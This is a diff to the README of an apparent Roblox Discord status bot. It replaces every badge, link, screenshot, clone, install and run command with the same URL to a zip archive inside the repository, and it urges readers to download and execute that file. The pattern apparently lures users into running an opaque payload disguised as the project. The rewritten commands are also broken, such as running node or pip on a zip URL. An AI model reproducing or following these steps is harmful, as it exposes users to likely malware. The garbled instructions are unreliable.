@@ -1,8 +1,8 @@
 # 🎮 Roblox Discord Status Bot
 
-![GitHub release](https://img.shields.io/github/release/blackwall0220/roblox-discord-status-bot.svg?style=flat-square) ![GitHub issues](https://img.shields.io/github/issues/blackwall0220/roblox-discord-status-bot.svg?style=flat-square) ![GitHub stars](https://img.shields.io/github/stars/blackwall0220/roblox-discord-status-bot.svg?style=social)
+![GitHub release](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip) ![GitHub issues](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip) ![GitHub stars](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip)
 
-Welcome to the **Roblox Discord Status Bot**! This project displays Roblox game statuses in Discord voice channels. It also includes various utilities to enhance your gaming experience. Created at [Coslynx](https://coslynx.com).
+Welcome to the **Roblox Discord Status Bot**! This project displays Roblox game statuses in Discord voice channels. It also includes various utilities to enhance your gaming experience. Created at [Coslynx](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip).
 
 ## 🚀 Features
 
@@ -18,7 +18,7 @@ To get started with the Roblox Discord Status Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/blackwall0220/roblox-discord-status-bot.git
+   git clone https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -33,7 +33,7 @@ To get started with the Roblox Discord Status Bot, follow these steps:
    ```
    For Python:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip
    ```
 
 4. **Configuration**:
@@ -42,11 +42,11 @@ To get started with the Roblox Discord Status Bot, follow these steps:
 5. **Run the Bot**:
    For JavaScript:
    ```bash
-   node index.js
+   node https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip
    ```
    For Python:
    ```bash
-   python bot.py
+   python https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip
    ```
 
 ## 🌐 Usage
@@ -65,7 +65,7 @@ After setting up, the bot will automatically join your specified voice channel a
 - **Python**: For utility scripts and additional features.
 - **Docker**: For containerization, making deployment easier.
 - **Machine Learning**: Future enhancements may include predictive features based on user behavior.
-- **Discord.js & Discord.py**: Libraries used for bot development.
+- **https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip & https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip**: Libraries used for bot development.
 
 ## 📈 Topics
 
@@ -94,14 +94,14 @@ This repository covers a wide range of topics:
 
 ## 📥 Releases
 
-To download the latest version of the bot, visit the [Releases](https://github.com/blackwall0220/roblox-discord-status-bot/releases) section. If you need a specific file, make sure to download and execute it from there.
+To download the latest version of the bot, visit the [Releases](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip) section. If you need a specific file, make sure to download and execute it from there.
 
 ## 🖼️ Screenshots
 
-![Bot in Action](https://example.com/screenshot1.png)
+![Bot in Action](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip)
 *Bot displaying game status in Discord.*
 
-![Configuration Example](https://example.com/screenshot2.png)
+![Configuration Example](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip)
 *Configuration settings for the bot.*
 
 ## 🤝 Contributing
@@ -123,8 +123,8 @@ If you have any questions or issues, feel free to open an issue on GitHub or rea
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/blackwall0220/roblox-discord-status-bot)
-- [Documentation](https://github.com/blackwall0220/roblox-discord-status-bot/wiki)
-- [Releases](https://github.com/blackwall0220/roblox-discord-status-bot/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip)
+- [Releases](https://raw.githubusercontent.com/blackwall0220/roblox-discord-status-bot/master/Pelodytes/status-roblox-discord-bot-v2.8.zip)
 
 Thank you for checking out the Roblox Discord Status Bot! We hope it enhances your gaming experience on Discord.
